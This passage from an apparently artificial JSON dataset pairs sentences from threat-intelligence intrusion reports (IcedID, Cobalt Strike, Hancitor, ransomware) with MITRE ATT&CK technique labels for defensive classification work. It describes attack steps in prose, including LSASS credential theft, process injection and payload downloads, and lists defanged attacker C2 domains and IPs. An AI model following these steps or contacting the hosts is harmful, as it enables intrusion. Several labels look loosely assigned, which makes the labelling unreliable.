    "text": "After execution, they dropped and ran ProcessHacker and then proceeded to open the batch file in notepad++ before re-running the script and ransomware.",
    "command": "",
    "labels": [
      "T1055",
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "Approximately two hours after the initiation of the ransomware on the file server, the threat actor revisited the system through their AnyDesk connection.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "In this return visit, they uninstalled FileZilla, signaling a move to cover their tracks.",
    "command": "",
    "labels": [
      "T1070.004"
    ]
  },
  {
    "type": "text",
    "text": "One interesting thing to note about the command and control domain for Cobalt Strike is it was seized by Microsoft, Fortra and Health-ISAC a few weeks after this intrusion.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "On April 6, 2023, the command and control domain changed DNS to Microsoft with a domain registration name of Digital Crimes Unit.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "The campaign ID used by threat actor was 3329953471, embedded in the configuration data in the IcedID DLL payload.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "A Windows batch file named “O p e n.cmd” was hidden behind a large button marked “Open” in the OneNote file with a blurred image of a document in the background and simple instructions in the foreground to double click the button.",
    "command": "",
    "labels": [
      "T1204.002"
    ]
  },
  {
    "type": "text",
    "text": "After clicking through the warning prompt, the O p e n.cmd file executed PowerShell to download an IcedID DLL named as if it was a JPG file, then used rundll32 to execute the DLL, which immediately connected to command and control servers, checked in and started beaconing over unencrypted HTTP, triggering an Emerging Threats Open rule: ET MALWARE Win32/IcedID Request Cookie.",
    "command": "",
    "labels": [
      "T1071.001",
      "T1105",
      "T1204.002",
      "T1218.011"
    ]
  },
  {
    "type": "text",
    "text": "The earliest indicators that something suspicious occurred were the Sysmon events: File Created (Event ID 11) and File Stream Created (Event ID 15) that showed a .cmd file with the Mark of the Web was created by OneNote:",
    "command": "",
    "labels": [
      "T1070.004"
    ]
  },
  {
    "type": "text",
    "text": "It uses PowerShell to download a payload file from a URL.",
    "command": "",
    "labels": [
      "T1071.001",
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "The remote server request makes it look like it could be a GIF image that is being downloaded.",
    "command": "",
    "labels": [
      "T1071.001",
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "The file is dropped to C:\\programdata\\ using a filename that looks like a JPEG image.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "The real filetype is actually a DLL:",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "The file was then run using rundll32.",
    "command": "",
    "labels": [
      "T1218.011"
    ]
  },
  {
    "type": "text",
    "text": "Somewhat surprisingly, more than a month after initial access in the intrusion, after the threat actor had started interacting with the compromised machine using AnyDesk, they opened the OneNote file and double-clicked the Open button to launch IcedID again.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "On the 33rd day of the intrusion, the IcedID malware was observed dropping several files.",
    "command": "",
    "labels": [
      "T1071.001",
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "These files were Cobalt Strike beacons, which were then executed via the IcedID malware.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "IcedID was running in rundll32.exe, which launched a DLL version of Cobalt Strike beacon from the user’s AppData\\Local\\Temp directory using regsvr32.exe.",
    "command": "",
    "labels": [
      "T1055",
      "T1218.011"
    ]
  },
  {
    "type": "text",
    "text": "The IcedID rundll32.exe process also launched an EXE version of a beacon named “Funa2.exe” from the same Temp directory.",
    "command": "",
    "labels": [
      "T1055",
      "T1218.011"
    ]
  },
  {
    "type": "text",
    "text": "During lateral movement activity, the threat actors deployed the same executable Cobalt Strike beacon as seen on the beachhead host.",
    "command": "",
    "labels": [
      "T1021.001",
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "This time, they used the name csrss.exe and executed these using the RDP session.",
    "command": "",
    "labels": [
      "T1021.001",
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "The files were downloaded onto the lateral hosts using Internet Explorer, then executed by clicking directly from the Internet Explorer download prompt or by double-clicking in File Explorer window.",
    "command": "",
    "labels": [
      "T1071.001",
      "T1105",
      "T1204.002"
    ]
  },
  {
    "type": "text",
    "text": "Throughout the later stages of the intrusion the Cobalt Strike beacons used various named pipes.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "One of the many effective ways to detect Cobalt Strike beacon in this intrusion was through the named pipes it created, which used the default naming patterns.",
    "command": "",
    "labels": [
      "T1055",
      "T1070.004"
    ]
  },
  {
    "type": "text",
    "text": "These pipe creation events were observed with Sysmon.",
    "command": "",
    "labels": [
      "T1070.004"
    ]
  },
  {
    "type": "text",
    "text": "A DLL version of the Cobalt Strike beacon was dropped on the beachhead host in the Local AppData Temp directory and executed with RegSvr32.exe, but that process did not create any named pipes.",
    "command": "",
    "labels": [
      "T1055",
      "T1218.011"
    ]
  },
  {
    "type": "text",
    "text": "During the initial execution of IcedID, the following two files were created under the AppData Roaming folder of the user that executed it: Cadiak.dll: IcedID first stage. license.dat: Encoded version of the second stage, which gets loaded into memory by the first stage.",
    "command": "",
    "labels": [
      "T1055",
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "A scheduled task was created that contained instructions for executing the IcedID DLL and the location of the license.dat file.",
    "command": "",
    "labels": [
      "T1053.005",
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "This is a very common method that IcedID uses for persistence.",
    "command": "",
    "labels": [
      "T1053.005"
    ]
  },
  {
    "type": "text",
    "text": "The scheduled task was configured to execute at logon under the user that initially executed the IcedID payload.",
    "command": "",
    "labels": [
      "T1053.005"
    ]
  },
  {
    "type": "text",
    "text": "During the deployment of AnyDesk, a service creation event was generated under the System channel:",
    "command": "",
    "labels": [
      "T1543.003"
    ]
  },
  {
    "type": "text",
    "text": "The user account that opened the initial OneNote lure file was in the domain administrators security group.",
    "command": "",
    "labels": [
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "Usually, threat actors have to work to escalate to a domain admin from an unprivileged user account, but in this case, it was a given.",
    "command": "",
    "labels": [
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "The threat actor was observed using common Windows process names for other tooling used during the intrusion, including: csrss.exe for a Cobalt Strike beacon downloaded from 91.215.85[.]183/download/csrss.exe svchost.exe for the ransomware payload deployed to systems.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "Upon execution of a Cobalt Strike beacon, process injection into a svchost.exe process was observed.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "In this case, process injection was conducted by writing into a remote process and executing the code via a remote thread.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "svchost.exe was subsequently observed executing multiple different commands related to discovery and enumeration.",
    "command": "",
    "labels": [
      "T1012",
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "Since the discovery commands involved executing scripts via cmd.exe, the anomalous parent child relationship between svchost.exe and cmd.exe was observed on the system from a memory dump.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "The threat actors extracted credentials from LSASS during the intrusion.",
    "command": "",
    "labels": [
      "T1003.001"
    ]
  },
  {
    "type": "text",
    "text": "The process started with a Cobalt Strike beacon process starting a new rundll32.exe child process, with no command line arguments, as SYSTEM.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "It is unusual for rundll32 to be executed without any command line, but it is a common pattern for Cobalt Strike beacon injection target processes.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "The newly spawned rundll32 process accessed the lsass.exe process, and then created a remote thread in lsass.exe.",
    "command": "",
    "labels": [
      "T1003.001",
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "After accessing and injecting into LSASS, the threat actors began using another domain administrator account indicating successful credential access.",
    "command": "",
    "labels": [
      "T1003.001",
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "During file share browsing activity by the threat actors, we observed them finding and opening a document related to passwords for the environment.",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "IcedID was observed executing multiple discovery commands originating from rundll32.exe on the beachhead.",
    "command": "",
    "labels": [
      "T1012",
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "These host profiling commands in this order are typically seen from IcedID bots, and reverse engineering the IcedID binary shows that they are hard-coded (in encrypted strings) to be run when the bot receives a specific command from its command and control server.",
    "command": "",
    "labels": [
      "T1059.003",
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "In different IcedID samples, the commands may appear in a different order, but all versions contain nearly the same list of profiling commands.",
    "command": "",
    "labels": [
      "T1012",
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "If the parent process is rundll32, regsvr32, or another high-risk process, the severity of the alert may be elevated.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "An AD.bat batch script and AdFind.exe were dropped onto the beachhead host from a process injected svchost.exe process.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "An injected process svchost.exe was observed dropping a ns.bat Batch script.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "Execution of ns.bat initiated the execution of nslookup commands that attempted to resolve multiple desktop and server hostnames.",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "Later, a second nsser.bat script was observed executing multiple nslookup commands.",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "During RDP sessions the threat actors were also observed opening Task Manager multiple times via the Start Menu, as indicated by the /7 flag.",
    "command": "",
    "labels": [
      "T1057"
    ]
  },
  {
    "type": "text",
    "text": "RDP was used by the threat actors to move laterally from the beachhead to other servers in the environment.",
    "command": "",
    "labels": [
      "T1021.001"
    ]
  },
  {
    "type": "text",
    "text": "After connecting to each server with RDP, the threat actors took steps to deploy a Cobalt Strike beacon, as well as AnyDesk on the system.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "The Cobalt Strike payload was downloaded from 91.215.85[.]183/download/csrss.exe via Internet Explorer.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "A concrete example is, directly after the threat actors accesses the file server with AnyDesk, they use notepad++ to open a file related to the insurance policy of this victim.",
    "command": "",
    "labels": [
      "T1033"
    ]
  },
  {
    "type": "text",
    "text": "On the beachhead, workstation files were opened with their ‘preferred’ option: Word for .docx, Excel for .xlsx and Internet Explorer for .pdf.",
    "command": "",
    "labels": [
      "T1033"
    ]
  },
  {
    "type": "text",
    "text": "On other machines, there was apparent interest in certain files, mainly related to possible passwords, PII and other financial data.",
    "command": "",
    "labels": [
      "T1033"
    ]
  },
  {
    "type": "text",
    "text": "The threat actors used three different ways to access the hosts within this network:IcedID,Cobalt Strike,AnyDesk.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "IcedID uses multiple staged domains to deliver parts of its functionality.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "The IcedID DLL running in the rundll32 process immediately connected to its command and control server on port 80, using domain name aerilaponawki[.]com, which resolved at the time to 193.149.129.131.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "The IcedID process also connected to two other command and control servers by domain name, but both of these connections used TLS over port 443, so it was not possible for the network sensor to observe as much content or match as many network detection rules as it would have with TLS termination or unencrypted traffic.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "The connection to klindriverfor[.]com (5.255.102.167) on port 443 repeated about once every 10 minutes for 12 days.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "The connection to alishaskainz[.]com (45.61.139.206) on port 443 also repeated about once every 10 minutes for 28 days.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "The connection from rundll32.exe is especially interesting and is related to our IcedID infection.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "It appears to be a different IP for one of the previously found command and control domains.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "The Cobalt Strike beacons which were used during the intrusion were named: agaloz.dll, Funa2.exe / csrss.exe.",
    "command": "",
    "labels": [
      "T1055",
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "The command and control server appears to have been in use through at least April 2024 with a different Cobalt Strike beacon reported to the Triage malware sandboxing service using the same gmail-like profile and remote IP as observed in this intrusion.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "According to The DFIR Report’s Threat Intel Team, the IP was observed hosting Cobalt Strike through June 3, 2023.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "After initial deployment, the threat actors downloaded additional beacons, all of which have a parent process of the executable called Funa2.exe.",
    "command": "",
    "labels": [
      "T1055",
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "It appears that the .dll likely didn’t work as expected, as five minutes later an .exe with the same name gets downloaded.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "Shortly after, we find the first connection to the server using the malleable profile paths:",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "This was performed by downloading the Filezilla FTP client installer using internet explorer on the server.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "In this case, we were able to recover part of the .xml files resulting in the below correlation between the network data and the host data.",
    "command": "",
    "labels": [
      "T1074.001"
    ]
  },
  {
    "type": "text",
    "text": "In this case, the threat actors moved around between a file server and a backup server, making and viewing configurations, dropping and ‘debugging’ the ransomware and finally cleaning up.",
    "command": "",
    "labels": [
      "T1070.004"
    ]
  },
  {
    "type": "text",
    "text": "The threat actors tried to circumvent these ‘locks’ by utilizing a tool called IOBit.",
    "command": "",
    "labels": [
      "T1112"
    ]
  },
  {
    "type": "text",
    "text": "This tool is capable of removing file locks.",
    "command": "",
    "labels": [
      "T1112"
    ]
  },
  {
    "type": "text",
    "text": "After encrypting the back up server, the threat actors uninstalled the backup software using add/remove programs.",
    "command": "",
    "labels": [
      "T1070.004"
    ]
  },
  {
    "type": "text",
    "text": "In May 2021, we observed a threat actor conducting an intrusion utilizing the IcedID payloads for initial access.",
    "command": "",
    "labels": [
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "They later performed a number of techniques from host discovery to lateral movement, using RDP and SMB to access the file servers within an enterprise domain.",
    "command": "",
    "labels": [
      "T1021.001"
    ]
  },
  {
    "type": "text",
    "text": "We assess with medium confidence that the initial IcedID infection was delivered via a malspam campaign, which included an attachment with a password protected zip archive.",
    "command": "",
    "labels": [
      "T1204.002"
    ]
  },
  {
    "type": "text",
    "text": "Once extracted, the user would find a Word document with a macro, which upon execution, would deliver the initial DLL loader.",
    "command": "",
    "labels": [
      "T1106",
      "T1204.002"
    ]
  },
  {
    "type": "text",
    "text": "Discovered in 2017, what started as a commodity malware, IcedID is now currently being deployed as an initial access broker by ransomware threat actors.",
    "command": "",
    "labels": [
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "Within 35 minutes after the initial infection, they made their way in to the network via a Cobalt Strike Beacon deployed from the IcedID infected host.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "The first task of the threat actor was to enumerate the network by establishing a list of the domain admins using living off the land techniques, such as net.exe.",
    "command": "",
    "labels": [
      "T1033"
    ]
  },
  {
    "type": "text",
    "text": "The threat actor was also observed stealing credentials from the lsass.exe process.",
    "command": "",
    "labels": [
      "T1003.001"
    ]
  },
  {
    "type": "text",
    "text": "Five minutes after the above discovery activity, we observed the actors moving laterally to other hosts on the network with the credentials of a domain administrator account.",
    "command": "",
    "labels": [
      "T1021.001",
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "In this case, Cobalt Strike was also used to create the administrative token, and attempted to install a service using a windows service executable.",
    "command": "",
    "labels": [
      "T1053.005",
      "T1543.003"
    ]
  },
  {
    "type": "text",
    "text": "The service was tasked to run an encoded PowerShell command which would download and execute the Cobalt Strike beacon over HTTP.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "It is also worth mentioning that even after the unsuccessful remote execution attempt against a few servers due to AV, the actors decided to connect via RDP and spend over an hour looking for valuable data before disconnecting and leaving the network.",
    "command": "",
    "labels": [
      "T1021.001"
    ]
  },
  {
    "type": "text",
    "text": "No exfiltration of data or impact to the systems was observed but at least one command and control.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "No attempt was made to clean up the intrusion by the actors – artifacts that were deployed were still in operation, including C2 implants.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "The first stage of the IcedID malware that was executed on the host was dropped via a macro enabled Word document – as seen by Unit42.",
    "command": "",
    "labels": [
      "T1204.002"
    ]
  },
  {
    "type": "text",
    "text": "This can be observed by EventID 106: New task registered:",
    "command": "",
    "labels": [
      "T1053.005"
    ]
  },
  {
    "type": "text",
    "text": "Inspection of the task file located under ‘c:\\windows\\system32\\tasks’:",
    "command": "",
    "labels": [
      "T1053.005"
    ]
  },
  {
    "type": "text",
    "text": "The corresponding DLL (upefkuin4.dll) is used with license.dat to maintain persistence using the Task Scheduler.",
    "command": "",
    "labels": [
      "T1053.005",
      "T1547.001"
    ]
  },
  {
    "type": "text",
    "text": "After decrypting License.dat using Binary Defense’s decryption tool, we can see some information stealing functionality:",
    "command": "",
    "labels": [
      "T1005"
    ]
  },
  {
    "type": "text",
    "text": "EventID 200: Task executed shows the persistent IcedID core being executed, on average every 1 hour via Rundll32.exe.",
    "command": "",
    "labels": [
      "T1053.005"
    ]
  },
  {
    "type": "text",
    "text": "The LSASS process was accessed by an unusual process “wuauclt.exe” on the beachhead host.",
    "command": "",
    "labels": [
      "T1003.001"
    ]
  },
  {
    "type": "text",
    "text": "This was the Cobalt Strike Beacon and was used to access the credentials.",
    "command": "",
    "labels": [
      "T1003.001"
    ]
  },
  {
    "type": "text",
    "text": "Discovery commands were run by IcedID during the initial execution on the beachhead.",
    "command": "",
    "labels": [
      "T1016",
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "These commands use the Microsoft Windows built-in commands and utilities, such as WMIC, ipconfig, etc.",
    "command": "",
    "labels": [
      "T1016",
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "The aim was to determine the installed Anti-virus software, network configuration, domain configuration and user accounts.",
    "command": "",
    "labels": [
      "T1016",
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "Using the information gathered, the IcedID operator was able to focus on specific targets, obtaining access to the privileged accounts and the high value hosts.",
    "command": "",
    "labels": [
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "Once the IcedID operators were able to establish a C2 session to the initial compromised host, the operators were observed executing the following command:",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "Interestingly, we observed the operator deploying and utilizing AdFind to collect information about the hosts on the network.",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "AdFind was transferred and executed on the beachhead host.",
    "command": "",
    "labels": [
      "T1070.004",
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "The threat actor placed the AdFind binary and the results in the ‘C:\\Recovery’ folder.",
    "command": "",
    "labels": [
      "T1070.004",
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "Throughout the intrusion the threat actor used a mix of Port 80 and 443 for C2.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "Port 80 was observed in the communication to testsubnet[.]com which contains a HTTP Cookie in the format: wordpress_<Base64EncodedString>.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "This activity was observed at a rate of every 2-4 seconds.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "Upon the user enabling macros, a Hancitor dll was executed, which called the usual suspect, Cobalt Strike.",
    "command": "",
    "labels": [
      "T1204.002"
    ]
  },
  {
    "type": "text",
    "text": "Like with many infections today, the threat actors gained initial access on a system through a malicious document email campaign, which made use of the Hancitor downloader.",
    "command": "",
    "labels": [
      "T1204.002"
    ]
  },
  {
    "type": "text",
    "text": "The document, upon opening and enabling of macros, would write and then execute a dll file from the users appdata folder.",
    "command": "",
    "labels": [
      "T1204.002",
      "T1218.011"
    ]
  },
  {
    "type": "text",
    "text": "The Hancitor dll downloaded and executed multiple payloads including a Cobalt Strike stager and Ficker Stealer.",
    "command": "",
    "labels": [
      "T1059.003",
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "After that, a battery of Windows utilities were run to check the windows domain trusts, domain administrators, domain controllers, and test connectivity.",
    "command": "",
    "labels": [
      "T1012"
    ]
  },
  {
    "type": "text",
    "text": "Cobalt Strike beacons were deployed to each server to facilitate remote access.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "The PowerShell script loaded the malicious code into memory and started beaconing out to the remote command and control server.",
    "command": "",
    "labels": [
      "T1055",
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "The threat actors then pivoted to the two domain controllers and deployed Cobalt Strike beacons.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "The threat actors continued pivoting to key systems including additional domain controllers, backup servers, and file shares, using Cobalt Strike.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "Within two hours of the initial malicious document execution, the threat actors had a foothold on all key systems in the environment.",
    "command": "",
    "labels": [
      "T1071.001",
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "Initial access was gained through a malicious document email campaign that aimed to trick the user into enabling Macros.",
    "command": "",
    "labels": [
      "T1204.002"
    ]
  },
  {
    "type": "text",
    "text": "Reviewing the document we can see the expected malicious macro and identify the location of a dll to be dropped in the:Options.DefaultFilePath",
    "command": "",
    "labels": [
      "T1204.002"
    ]
  },
  {
    "type": "text",
    "text": "And once the dll “ier” is written there, the macro proceeds to execute it.",
    "command": "",
    "labels": [
      "T1055",
      "T1204.002"
    ]
  },
  {
    "type": "text",
    "text": "Three files were downloaded by Hancitor from 4a5ikol[.]ru (8.211.241.0) including two Cobalt Strike stagers and Ficker Stealer.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "Hancitor then launched multiple instances of svchost.exe and process injected them with Cobalt Strike.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "The following diagram shows the initial execution process from the WINWORD.exe to the Cobalt Strike Beacons that were injected into memory by Hancitor.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "Lastly, a Cobalt Strike command and control server was pinged before they copied the Cobalt Strike DLL and batch file, which were used to facilitate lateral movement.",
    "command": "",
    "labels": [
      "T1055",
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "The batch file (cor.bat) is a 3-line script that will execute the Cobalt Strike DLL using rundll32.exe with a specific parameter.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "The Cobalt Strike DLL used in this case resembles the same Cobalt Strike DLL seen in case 4301 based on the YARA rule associated to that case, indicating likely links between the actors in the two cases.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "On the Domain Controller a service (Event ID 7045) will be created that will run the Reset-ComputerMachinePassword PowerShell Cmdlet.",
    "command": "",
    "labels": [
      "T1543.003"
    ]
  },
  {
    "type": "text",
    "text": "Zerologon will create an Event ID 4624 for the domain controller computer account attempting to authenticate.",
    "command": "",
    "labels": [
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "Lastly, Event ID 4648 will be logged on the beachhead machine indicating the zero.exe process was used to connect to a domain controller.",
    "command": "",
    "labels": [
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "Upon Hancitor launching on the system, it process injected into multiple instances of svchost.exe and rundll32.exe.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "Memory segments can be seen allocated with Execute, Read, and Write permissions, indicating that executable code is stored.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "Anomalous parent and child process relationships can be seen on the system that Hancitor was executed on, including rundll32.exe spawning svchost.exe and svchost.exe spawning cmd.exe.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "After many iterations, the script would deobfuscate and run-in memory.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "The shellcode is responsible for loading a PE file into memory and calling out to 64.235.39[.]32 for further instructions.",
    "command": "",
    "labels": [
      "T1055",
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "Notice above, the threat actors pinged 190.114.254[.]116 which is one of the Cobalt Strike servers they later used.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "The main actions involved copying a Cobalt Strike DLL beacon and a batch script to run the DLL (cor.dll, cor.bat, GAS.dll, GAS.bat).",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "Operators executed the batch script through a remotely created service on the target system.",
    "command": "",
    "labels": [
      "T1053.005"
    ]
  },
  {
    "type": "text",
    "text": "The following shows one of the batch scripts used to run a Cobalt Strike payload.",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "The PowerShell script had instructions to deobfuscate shellcode and run it in memory as a thread in the same PowerShell process.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "The shellcode itself also has a PE file embedded inside of itself.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "Once the shellcode is running this PE file will be loaded into memory and executed.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "The PE file is of a small size and has the capability to beacon out at regular intervals to a command-and-control server on 64.235.39[.]32 to retrieve instructions.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "This is most likely instructions that the previously discussed PE file retrieved from the remote command and control server.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "Hancitor contacted its servers over HTTP and advertised details about the compromised machine, user, and domain while also retrieving instructions from the command and control server (1).",
    "command": "",
    "labels": [
      "T1071.001",
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "From another dedicated location, 4a5ikol[.]ru, two Cobalt Strike beacons and Ficker Stealer malware were downloaded through HTTP (2).",
    "command": "",
    "labels": [
      "T1071.001",
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "Cobalt Strike was also observed to be making use of HTTP.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "Lastly, the shellcode executed by the agent1.ps1 PowerShell loader, was observed loading a PE file into memory that would beacon out at consistent intervals to 64.235.39[.]32.",
    "command": "",
    "labels": [
      "T1055",
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "Further encrypted network activity was also observed to this IP address.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "An attacker logged into the honeypot from 93.174.95[.]73, disabled security tools, dropped their toolkit and started recon.",
    "command": "",
    "labels": [
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "The script is written to handle 64 and 32 bit systems as it checks the processor architecture before running each of the password dumping tools.",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "The second half of the script runs ChromePass, Dialupass, iepv, mailpv, mspass, OperaPassView, pspv, PstPassword, rdpv, RouterPassView, VNCPassView, and WebBrowserPassView before deleting the mimikatz files.",
    "command": "",
    "labels": [
      "T1070.004"
    ]
  },
  {
    "type": "text",
    "text": "The goal of this script is to parse out the Mimikatz output so its easier for the actor to use passwords/NTLM.",
    "command": "",
    "labels": [
      "T1003.001"
    ]
  },
  {
    "type": "text",
    "text": "Find-Pass.ps1 – We believe this script was used to run mimikatz and the other password dumping tools.",
    "command": "",
    "labels": [
      "T1003.001"
    ]
  },
  {
    "type": "text",
    "text": "NetADPC.ps1 – We believe this script launched Network Port Scanner and helped with RDP connections.",
    "command": "",
    "labels": [
      "T1021.001"
    ]
  },
  {
    "type": "text",
    "text": "The ransomware was deployed in a manual fashion requiring the actor to RDP to each machine that Network Port Scanner found.",
    "command": "",
    "labels": [
      "T1021.001"
    ]
  },
  {
    "type": "text",
    "text": "Before encrypting files the ransomware uses many windows utilities such as WMI, taskkill, WEVTUTIL, and net.exe to kill processes and remove logs from the system.",
    "command": "",
    "labels": [
      "T1562.001"
    ]
  },
  {
    "type": "text",
    "text": "In this short intrusion, the threat actor gained initial access on a system through a maldoc campaign which made use of the Hancitor downloader.",
    "command": "",
    "labels": [
      "T1204.002"
    ]
  },
  {
    "type": "text",
    "text": "The first-stage DLL, which was dropped by a malicious Word document, attempted to download multiple malware payloads on the beachhead system, including Ficker Stealer.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "In addition, a Cobalt Strike beacon payload was downloaded, and deployed to perform post-exploitation activities.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
